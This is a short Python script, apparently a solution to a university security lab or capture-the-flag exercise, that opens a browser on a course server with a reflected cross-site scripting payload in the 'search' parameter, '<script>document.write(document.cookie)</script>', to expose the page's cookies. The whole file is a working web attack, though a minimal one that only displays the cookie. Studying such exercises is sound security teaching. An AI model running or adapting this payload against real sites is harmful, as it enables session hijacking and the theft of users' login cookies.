import requests
import webbrowser

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22251"

s = requests.Session()
webbrowser.open(link + "/?search=<script>document.write(document.cookie)</script>")